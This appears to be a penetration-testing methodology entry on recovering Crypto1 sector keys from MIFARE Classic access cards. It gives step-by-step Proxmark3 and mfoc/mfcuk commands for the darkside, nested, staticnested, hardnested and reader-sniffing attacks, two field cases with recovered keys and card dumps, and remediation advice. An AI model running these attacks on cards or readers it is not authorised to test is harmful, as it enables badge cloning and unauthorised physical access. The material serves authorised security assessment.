---
id: RFSAM-RFID-CR-01
title: Assess Crypto1 key strength on MIFARE Classic
protocol: RFID
layer: CR
criticality: high
applicability:
  - MIFARE Classic (1K/4K)
  - MIFARE Classic EV1 (hardened PRNG)
  - MIFARE Plus in SL1 (Crypto1-compatible mode)
  - "MIFARE-compatible clones (Fudan FM11RF08/FM11RF08S, etc.)"
deferred: false
objective: >-
  Determine whether the Crypto1 sector keys protecting an ISO 14443-A MIFARE
  Classic credential can be recovered, card-only, with one known key, or from a
  sniffed reader transaction, and therefore whether the credential is clonable.
intro: >-
  MIFARE Classic's proprietary Crypto1 cipher uses a 48-bit key and a weak
  LFSR-based PRNG, and is fundamentally broken. Depending on the card's nonce
  behaviour, sector keys are recoverable card-only (no reader needed), with one
  known key, or from a captured reader authentication, making most Crypto1
  access systems effectively clonable. This control selects the applicable
  attack and recovers the keys; it is RFSAM-owned (RFID is near-field; there is
  no BSAM equivalent for this layer).
prerequisites:
  hardware:
    - 'A Proxmark3 (RDV4 or compatible, running the Iceman firmware), the reference HF tool for both the cryptanalytic attacks and the dump'
    - 'Alternatively a libnfc-driven PN532 / ACR122U USB reader for the offline mfoc / mfcuk crackers, or a Chameleon Ultra for read/emulate'
    - 'A target MIFARE Classic card in the field, or physical access to a legitimate reader for the reader-side (mfkey) path'
  software:
    - 'pm3 client (Iceman): hf 14a info / hf mf info / autopwn / darkside / nested / hardnested / mf sim'
    - 'Or mfoc (nested) and mfcuk (darkside) on libnfc; mfkey32/mfkey64 for reader-side recovery'
  signal:
    freq: 'HF 13.56 MHz (ISO 14443-A), near-field, magnetically coupled; no far-field radiation to survey'
    bandwidth: 'Subcarrier load modulation at 847.5 kHz (fc/16); ~106 kbit/s baseline data rate'
    modulation: 'Reader→card: 100% ASK with modified Miller coding. Card→reader: OOK load modulation of an 847.5 kHz subcarrier with Manchester coding (ISO 14443-A)'
  skill: intermediate
attacks:
  - name: Darkside attack
    refs:
      - courtois2009darkside
    impact: Recovers a first sector key with no prior key and no reader, by querying only the card for a few minutes.
    preconditions: A MIFARE Classic card with the original weak (16-bit-LFSR) PRNG that leaks via NACK and nonce repetition; ineffective against truly-random-nonce EV1 / hardened cards.
    summary: >-
      Card-only key recovery exploiting the Crypto1 NACK parity leak and nonce
      repetition, bootstraps the first key when no default key works.
  - name: Nested attack
    refs:
      - garcia2009pickpocket
    impact: Recovers all remaining sector keys once any one key is known, by triggering nested (sector-to-sector) authentications.
    preconditions: At least one known key (often a default/transport key) and a predictable PRNG so encrypted nonces can be guessed via the parity leak.
    summary: >-
      Given one known key and a predictable PRNG, recovers the remaining sector
      keys by filtering nonce guesses through the Crypto1 parity keystream leak.
  - name: Static-nonce nested (statiCnested)
    refs:
      - proxmark3-iceman
    impact: Recovers the remaining sector keys on a card that returns a constant tag nonce, the case where plain nested and darkside both fail, given one known key, which on these clones is almost always a default.
    preconditions: 'A MIFARE Classic / Fudan clone whose PRNG returns a fixed nonce every authentication (hf mf info → "Static nonce... yes"), plus one known sector key; default keys are present on most such cards.'
    summary: >-
      Variant of the nested attack for static-nonce cards: with the tag nonce
      constant, derives the set of sector-key candidates consistent with it and
      verifies them online against the card, seeded by one known key.
  - name: Hardnested attack
    refs:
      - meijer2015hardnested
    impact: Recovers a key on hardened cards (MIFARE Classic EV1) that resist the plain nested attack, in roughly five minutes on a laptop.
    preconditions: One known key on the card; works against truly-random nonces by reducing the search from 2^48 to about 2^30 via ciphertext-only statistical cryptanalysis.
    summary: >-
      Defeats hardened MIFARE Classic EV1 (truly-random nonces) with a
      ciphertext-only statistical attack on collected nonces; needs one known key.
  - name: Static-encrypted-nonce break and FM11RF08S hardware backdoor
    refs:
      - teuwen2024fm11rf08s
    impact: Recovers keys on the most-hardened "static encrypted nonce" Crypto1 clones, and a shared hardware backdoor key compromises all user keys on affected Fudan cards.
    preconditions: A Fudan FM11RF08S (or related FM11RF08/FM11RF32/FM1208) card; a few minutes of card access. The backdoor key is common across the product line.
    summary: >-
      Breaks the static-encrypted-nonce variant designed to thwart all known
      card-only attacks, and documents a manufacturer backdoor key shared across
      FM11RF08S cards.
  - name: mfkey32 / mfkey64 reader-key extraction
    refs:
      - garcia2008dismantling
    impact: Recovers a sector key from one or two captured reader↔card authentications, attacking the reader side rather than the card.
    preconditions: The ability to sniff (or relay) a genuine reader authenticating to a real card for that sector; no card-only access needed.
    summary: >-
      Recovers a sector key from a sniffed reader authentication exchange using
      the Crapto1 keystream-recovery technique, attacks the reader, not the card.
references:
  - key: garcia2008dismantling
    title: Dismantling MIFARE Classic
    authors: 'F. D. Garcia, G. de Koning Gans, R. Muijrers, P. van Rossum, R. Verdult, R. Wichers Schreur, B. Jacobs'
    venue: 'ESORICS 2008, LNCS 5283, pp. 97 to 114'
    year: 2008
    url: 'http://www.cs.ru.nl/~rverdult/Dismantling_MIFARE_Classic-ESORICS_2008.pdf'
    type: paper
  - key: garcia2009pickpocket
    title: Wirelessly Pickpocketing a Mifare Classic Card
    authors: 'F. D. Garcia, P. van Rossum, R. Verdult, R. Wichers Schreur'
    venue: 'IEEE Symposium on Security and Privacy (S&P) 2009, pp. 3 to 15'
    year: 2009
    url: 'https://doi.org/10.1109/SP.2009.6'
    type: paper
  - key: courtois2009darkside
    title: 'The Dark Side of Security by Obscurity: and Cloning MiFare Classic Rail and Building Passes, Anywhere, Anytime'
    authors: N. T. Courtois
    venue: 'SECRYPT 2009 / IACR ePrint 2009/137'
    year: 2009
    url: 'https://eprint.iacr.org/2009/137'
    type: paper
  - key: meijer2015hardnested
    title: Ciphertext-only Cryptanalysis on Hardened MIFARE Classic Cards
    authors: 'C. Meijer, R. Verdult'
    venue: 'ACM CCS 2015'
    year: 2015
    url: 'http://cs.ru.nl/~rverdult/Ciphertext-only_Cryptanalysis_on_Hardened_Mifare_Classic_Cards-CCS_2015.pdf'
    type: paper
  - key: teuwen2024fm11rf08s
    title: 'MIFARE Classic: exposing the static encrypted nonce variant'
    authors: P. Teuwen
    venue: 'IACR ePrint 2024/1275 / Quarkslab'
    year: 2024
    url: 'https://eprint.iacr.org/2024/1275'
    type: paper
  - key: teuwen2024blog
    title: 'MIFARE Classic: exposing the static encrypted nonce variant… and a few hardware backdoors'
    authors: P. Teuwen (Quarkslab)
    venue: Quarkslab blog
    year: 2024
    url: 'https://blog.quarkslab.com/mifare-classic-static-encrypted-nonce-and-backdoors.html'
    type: blog
  - key: proxmark3-iceman
    title: Proxmark3, Iceman fork (RfidResearchGroup)
    venue: GitHub
    url: 'https://github.com/RfidResearchGroup/proxmark3'
    type: tool
  - key: mfoc-tool
    title: 'mfoc: MIFARE Classic Offline Cracker (nested attack)'
    venue: GitHub (nfc-tools)
    url: 'https://github.com/nfc-tools/mfoc'
    type: tool
  - key: mfcuk-tool
    title: 'mfcuk: MiFare Classic Universal toolKit (darkside attack)'
    venue: GitHub (nfc-tools)
    url: 'https://github.com/nfc-tools/mfcuk'
    type: tool
tools:
  - pm3-client
  - proxmark3
  - mfoc
  - mfcuk
  - libnfc
  - acr122u
  - chameleon-ultra
resources:
  - RFSAM-RES-13
  - RFSAM-RES-14
reviewStatus: verified
confidence: high
lastResearched: 2026-06-18
---

## Mechanism

MIFARE Classic protects each sector with a pair of 48-bit Crypto1 keys (A and B) and authenticates with a three-pass challenge-response. The cipher and its protocol were reverse-engineered and fully dismantled in 2008: Crypto1 is a 48-bit LFSR stream cipher with a non-linear filter, fed by a 16-bit LFSR card nonce, and the keystream leaks through the parity bits transmitted over the air [`garcia2008dismantling`]. That parity leak, plus the predictability of the card nonce, is what every Crypto1 attack exploits, the 48-bit key space is never brute-forced directly.

The applicable attack depends on the card's nonce behaviour, so the first job of this control is to classify it:

- **Original weak PRNG (most legacy 1K/4K).** The card nonce comes from a 16-bit LFSR that the reader can advance to a known value, and the card leaks a NACK on bad parity. The **darkside** attack uses these two leaks to recover a first key card-only, with no reader and no prior key, in a few minutes [`courtois2009darkside`]. Once any one key is known, the **nested** attack triggers sector-to-sector ("nested") authentications and recovers every remaining key from the encrypted-nonce parity leak [`garcia2009pickpocket`].
- **Static nonce (many Fudan-based clones).** Some MIFARE-compatible cards return a *constant* tag nonce on every authentication. A fixed nonce defeats both darkside and the plain nested attack, each needs the nonce to vary to correlate keystream, but it does not save the card: given one known sector key (default keys are almost always present on these clones), the **staticnested** attack derives the candidate keys consistent with that constant nonce and verifies them against the card, recovering the remaining sectors in seconds [`proxmark3-iceman`]. `hf mf info` flags this case as `Static nonce... yes`; do not confuse it with the *static encrypted nonce* of the FM11RF08S below, which prints differently and is a separate attack.
- **Hardened PRNG (MIFARE Classic EV1 and hardened clones).** These emit truly-random nonces, defeating darkside and plain nested. The **hardnested** attack is a ciphertext-only statistical cryptanalysis that, given one known key, collects encrypted nonces and reduces the search from 2^48 to roughly 2^30, recovering a key in about five minutes on a single laptop core [`meijer2015hardnested`].
- **Static encrypted nonce (Fudan FM11RF08S and relatives).** A 2020-era "MIFARE-compatible" variant added a static-encrypted-nonce countermeasure specifically to thwart all known card-only attacks. In 2024 this was broken, and a **hardware backdoor key common to all FM11RF08S cards** was recovered: anyone who knows it can authenticate to and dump user sectors without the user keys, in a few minutes of card access [`teuwen2024fm11rf08s`, `teuwen2024blog`].

There is also a reader-side path. When a genuine reader is observed authenticating to a real card, **mfkey32** recovers a sector key from two authentication attempts on the same nonce, and **mfkey64** from a single full authentication, both reconstruct the Crypto1 state from the captured (encrypted) handshake rather than touching the card [`garcia2008dismantling`]. This is the route when the card itself is out of reach but a reader is not.

A practical shortcut precedes all of the above: enormous numbers of deployments never change the transport keys, so a **default/dictionary key check** (`FFFFFFFFFFFF`, `A0A1A2A3A4A5`, …) frequently recovers keys with no cryptanalysis at all. RFID is near-field and RFSAM-owned at this layer; LF tags and DESFire/AES cards are out of scope for these attacks, recognise them and stop, per the Wayfinder.

## Procedure

All steps below are active interrogation of a credential. Run them only against cards and readers you own or are explicitly authorised to test, with the card under your physical control.

1. **Identify the card and classify its PRNG.** With a Proxmark3 (Iceman), place the card on the antenna and fingerprint it:
   ```
   [usb] pm3 --> hf 14a info
   [usb] pm3 --> hf mf info
   ```
   Expected: `hf 14a info` prints the UID, SAK, ATQA and the chip guess (e.g. *MIFARE Classic 1K*). `hf mf info` reports the PRNG / nonce class, read it as **weak** (`darkside`/`nested`), **static nonce** (`Static nonce... yes` → `staticnested`), **hardened/random** (`hardnested`), or **static *encrypted* nonce** (FM11RF08S techniques). It also fingerprints the chip (e.g. *Fudan based card*) and surfaces any sector already on a default key. Note whether the UID is 4-byte or 7-byte and whether the card is a known Fudan clone.

2. **Try default and dictionary keys first.** Many systems never change them:
   ```
   [usb] pm3 --> hf mf chk *1 ? d
   ```
   Expected: a per-sector table of recovered keys A/B. If every sector resolves here, skip straight to step 6, no cryptanalysis was needed (a finding in itself).

3. **Run the matching card-only attack.** Let `hf mf autopwn` orchestrate the chain, it reads the PRNG class from step 1, tries the dictionary, and picks the attack per sector. The explicit single-attack forms are also shown:
   ```
   [usb] pm3 --> hf mf autopwn
   [usb] pm3 --> hf mf darkside                                      # weak PRNG, no known key, bootstrap a first key
   [usb] pm3 --> hf mf staticnested --1k --blk 0 -a -k FFFFFFFFFFFF  # static nonce, seed from a known key
   ```
   Expected: for a **weak-PRNG** card with no known key, `darkside` returns a first key in a few minutes and `autopwn` then chains nested → key-table → dump. For a **static-nonce** card (most Fudan clones, `hf mf info` printed `Static nonce... yes`), darkside and plain nested do not apply; `autopwn` seeds from any default key it finds and runs `staticnested` for the rest. Read *which* attack actually recovered each key from the result column of the key table, the legend is `D`:dictionary · `S`:darkside · `N`:nested · `H`:hardnested · **`C`:statiCnested** · `R`:reused · `U`:user. Offline tools on a PN532/ACR122U cover only the weak path: `mfoc -O dump.mfd` (nested, needs one known/default key) or `mfcuk -C -R 0:A -s 250 -S 250` (darkside), neither implements the static-nonce attack, so a static-nonce card needs the Proxmark.

4. **For hardened (EV1 / hard-PRNG) cards, use hardnested with one known key.** If a default key was found for any sector in step 2, recover the rest:
   ```
   [usb] pm3 --> hf mf nested
   [usb] pm3 --> hf mf hardnested --blk 0 -a -k FFFFFFFFFFFF --tblk 4 --ta
   ```
   Expected: `nested` handles predictable-PRNG cards; `hardnested` collects nonces and returns the target key in roughly five minutes [`meijer2015hardnested`]. (`autopwn` selects nested, staticnested, or hardnested for you based on the step-1 classification.)

5. **Reader-side path (card unreachable, reader available).** Sniff a genuine authentication and recover the key offline:
   ```
   [usb] pm3 --> hf 14a sniff
   [usb] pm3 --> hf mf list
   ```
   Then feed the captured `{uid, nt, nr, ar}` (and `at` for mfkey64) to the recovery tool. Expected: mfkey32 yields a key from two captured attempts on the same nonce; mfkey64 from a single complete handshake.

6. **Dump every sector and assess clonability.** With the key table populated:
   ```
   [usb] pm3 --> hf mf dump
   [usb] pm3 --> hf mf autopwn          # also writes the dump + keyfile
   ```
   Expected: a full `*.bin` / `*.eml` dump plus the recovered key file. Parse it (e.g. `mfdread`) to read the access-control payload (facility/card number, value blocks). If all keys are recovered, the credential is clonable, to a magic Gen1a/Gen2 card or emulated from a Chameleon Ultra (see RFSAM-RES-14). Recovering the keys here, not the clone, is the finding this control records.

## Field case

Real capture, a Fudan-based MIFARE Classic 1K clone (FNUID, fixed UID) on the bench, decrypted end-to-end with a Proxmark3 (Iceman) in 37 seconds. This is the **static-nonce** branch above, demonstrated.

1. `hf mf info` fingerprinted it as a **Fudan based card**, Classic 1K, UID `8F 05 E5 D8`, ATQA `0004`, SAK `08`, block 0 `8F05E5D8B70804006263646566676869` (the trailing `6263646566676869` is ASCII `bcdefghi`, the placeholder manufacturer bytes these clones ship with). The PRNG section reported a **plain static nonce**, not a static *encrypted* nonce, and sector 0 already authenticated with the transport default:
   ```
   [#] Static nonce....... 01200145
   [+] Static nonce... yes
   [+] Sector 0 key A... FFFFFFFFFFFF
   [+] Sector 0 key B... FFFFFFFFFFFF
   ```

2. `hf mf autopwn` recovered every key in one pass. The dictionary resolved 15 of the 16 sectors (0 and 2 to 15, A and B) to the default `FFFFFFFFFFFF`. Sector 1 held a non-default key and fell to **staticnested**, autopwn derived `59578` candidate keys consistent with the static nonce, verified them online at ~160 keys/s, and hit the valid one inside the first thousand:
   ```
   [+] target block    4 key type A -- found valid key [ 8A19D40CF2B5 ]
   [+] Target sector   1 key type A -- found valid key [ 8A19D40CF2B5 ]
   ```
   The result column confirms which attack recovered each sector, `D` (dictionary) for the 15 default sectors, **`C` (statiCnested)** for sector 1:
   ```
   [+]  Sec | Blk | key A        |res| key B        |res
   [+]  000 | 003 | FFFFFFFFFFFF | D | FFFFFFFFFFFF | D
   [+]  001 | 007 | 8A19D40CF2B5 | C | 8A19D40CF2B5 | C
   [+]  002 | 011 | FFFFFFFFFFFF | D | FFFFFFFFFFFF | D
   [+]  ... | ... | FFFFFFFFFFFF | D | FFFFFFFFFFFF | D
   [+]  015 | 063 | FFFFFFFFFFFF | D | FFFFFFFFFFFF | D
   ```

3. With all 32 keys (16 sectors × A/B) recovered, autopwn wrote the keyfile and a full 1024-byte dump:
   ```
   [+] Found keys have been dumped to `hf-mf-8F05E5D8-key.bin`
   [+] Saved 1024 bytes to binary file `hf-mf-8F05E5D8-dump.bin`
   [=] Autopwn execution time: 37 seconds
   ```

4. Reading the dump back (`hf mf dump`, then `hf mf view`) shows *why* the static-nonce attack earned its keep: the one key that wasn't the default, sector 1's `8A19D40CF2B5`, also guards the only sector on the card that holds data. Its trailer carries the recovered key in situ, and blocks 4 to 6 are the only non-zero bytes anywhere on the card:
   ```
   [=]  sec | blk | data                                            | ascii
   [=]    0 |   0 | 8F 05 E5 D8 B7 08 04 00 62 63 64 65 66 67 68 69 | ........bcdefghi
   [=]    1 |   4 | 4D B2 00 00 00 00 00 00 00 00 00 00 00 00 00 00 | M...............
   [=]      |   5 | 00 20 12 C1 82 00 0E E8 3C F9 EF 31 9A B2 11 00 | . ......<..1....
   [=]      |   6 | 9E 84 FF 6D 03 BE 00 00 00 00 00 00 00 00 00 00 | ...m............
   [=]      |   7 | 8A 19 D4 0C F2 B5 FF 07 80 69 8A 19 D4 0C F2 B5 | .........i......
   ```
   Block 7 is sector 1's trailer: key A `8A19D40CF2B5`, access bits `FF 07 80`, GPB `69`, key B `8A19D40CF2B5`, the staticnested-recovered key, now readable on the card. Every other sector (0, 2 to 15) is blank data behind the default trailer `FF FF FF FF FF FF FF 07 80 69 FF FF FF FF FF FF`. The sector-1 bytes are an opaque application payload, recorded as captured, not interpreted.

The finding this records: **every Crypto1 key on a real Classic 1K recovered card-only in 37 seconds**, 15 sectors still on the transport default, and the one non-default key (`8A19D40CF2B5`) recovered by the static-nonce nested attack that plain nested and darkside cannot perform. The card offers no cryptographic protection; with the keys and dump in hand it is fully clonable to a magic Gen1a/Gen2 card or emulated from a Chameleon Ultra (see RFSAM-RES-14). The other nonce classes differ only in the attack chosen: a weak-PRNG card with no default key starts with `hf mf darkside`; a hardened EV1 card uses `hf mf hardnested` seeded with one known key, recovering a target key in about five minutes [`meijer2015hardnested`]; an FM11RF08S clone instead falls to the static-*encrypted*-nonce techniques and the shared hardware backdoor key [`teuwen2024fm11rf08s`].

**A second card makes that last branch concrete, a genuine FM11RF08S.** This case is reconstructed from the saved dump and keyfile, not a live console log (the card was no longer on hand to re-capture the run); the recovery itself is what the artifacts prove, the FM11RF08S tool's `…-nonces_with_data.json` plus a complete 1 KB dump with every key resolved. It reads as a Classic 1K, UID `E2 96 C1 9A`, SAK `08`, ATQA `0004`, block 0 `E296C19A 2F 08 0400 0544FDD8A539F490`, but two things mark it as an FM11RF08S rather than the all-default clone above: the manufacturer bytes are *real* (`0544FDD8A539F490`, not the `bcdefghi` placeholder), and it carries the extra hidden config sector only that chip has. Unlike the Fudan card, it is genuinely keyed, diversified non-default keys on several sectors, with non-default access bits:

```
sec | key A        | key B        | access | note
  0 | A0A1A2A3A4A5 | B578F38A5C61 | 787788 | key B non-default
  1 | D203A62D6106 | 602A34A75AA4 | 787788 | both non-default
  2 | A0A1A2A3A4A5 | 0000014B5C31 | 0F00FF | key B non-default
  6 | FFFFFFFFFFFF | 96A301BCE267 | 0F00FF | key B non-default
  3 to 5, 7 to 15        | default FFFFFFFFFFFF / FFFFFFFFFFFF
  hidden config sector | key A 3E64977BDF58 | key B 00005BF0055A
```

Those keys are not guessable and there is no weak or predictable nonce to attack, the static-encrypted-nonce countermeasure was built specifically to defeat darkside, nested and hardnested alike. The FM11RF08S break sidesteps all three: a hardware backdoor key shared across the product line authenticates to the sectors without the user keys, exposes each sector's static encrypted nonce (the values the `nonces_with_data.json` recorded), and from those the user keys fall in a few minutes of card access [`teuwen2024fm11rf08s`, `teuwen2024blog`]. The saved artifacts are exactly that outcome, all 16 sector keys plus the hidden sector recovered, and the full 1 KB read, including the high-entropy sector-1 payload that was only readable once its non-default keys fell:

```
blk 4 (sec 1): 0B54C20A3DD92C5DC8E72B430EA01D9A
blk 5 (sec 1): E565FA30CF15A6DEA2D4F0B734028E7F
blk 6 (sec 1): 409B343083DE680526A03200FEFD0EA2
```

The finding this second case records: *a card sold as a hardened, non-cloneable MIFARE Classic, real diversified keys, non-default access bits, the static-encrypted-nonce defence, still surrenders every key to the shared FM11RF08S backdoor.* That is the whole lesson of the FM11RF08S story, and the reason the remediation below is the same for it as for the trivial clone: no Crypto1-compatible countermeasure, not even this one, has held.

## Remediation

**Developer / product team.** Do not design new systems on MIFARE Classic or any Crypto1-compatible card (including MIFARE Plus operated in SL1 and "MIFARE-compatible" clones). Crypto1 is broken by design, a 48-bit key with a parity keystream leak, and no card-only countermeasure has held: even the static-encrypted-nonce FM11RF08S fell and shipped with a shared hardware backdoor [`teuwen2024fm11rf08s`]. Specify audited cryptographic credentials (MIFARE DESFire EV2/EV3 with AES, or equivalent) with per-card diversified keys and challenge-response that binds to card-authenticated data, not to the UID.

**Integrator.** Never authorise on UID alone, UIDs are freely clonable to magic cards regardless of Crypto1. If a Crypto1 deployment cannot be replaced immediately, at minimum change all transport/default keys (a default key collapses the entire attack chain to step 2), use both A and B keys with least-privilege access bits, and plan migration; treat every Crypto1 sector key as recoverable by an attacker with a few minutes of card or reader access.

**Operator.** Assume any Crypto1 badge in your environment is clonable and act at the backend: enable anti-passback and impossible-travel / velocity anomaly detection, log and alert on duplicate-UID or out-of-sequence reads, and shorten credential lifetimes. These do not fix the card, they detect use of a clone after the keys are gone, so prioritise migration off Crypto1 over compensating controls.
